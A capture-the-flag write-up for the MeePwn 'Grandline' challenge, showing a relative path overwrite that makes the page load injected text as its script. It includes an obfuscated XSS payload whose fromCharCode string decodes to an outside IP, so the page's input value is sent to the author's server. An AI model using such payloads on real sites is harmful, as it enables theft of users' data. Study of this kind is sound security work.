# Grandline

`Author: SYM01`

There is a `RPO` problem in the website. When visit [http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/{abc}/](http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/{abc}/), the page will load the script from `http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/{abc}/js/jquery.min.js`.

The only thing we need to to is making that script evil. 
We simply replace the token `{abc}` with the following payload, 
then the evil script works and sends the flag to our server.
```txt
*/window.onload=function()%7Blocation=String.fromCharCode(104,116,116,112,58,47,47,51,53,46,50,48,55,46,52,46,50,51,47)%2Bdocument.querySelectorAll(String.fromCharCode(105,110,112,117,116))[1].value%7D;console.log(/*
```

So the final payload is 
```url
http://localhost/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/window.onload=function()%7Blocation=String.fromCharCode(104,116,116,112,58,47,47,51,53,46,50,48,55,46,52,46,50,51,47)%2Bdocument.querySelectorAll(String.fromCharCode(105,110,112,117,116))[1].value%7D;console.log(/*/
```

-->
`You are on new world, flag: MeePwnCTF{Welcome_to_New_World}`
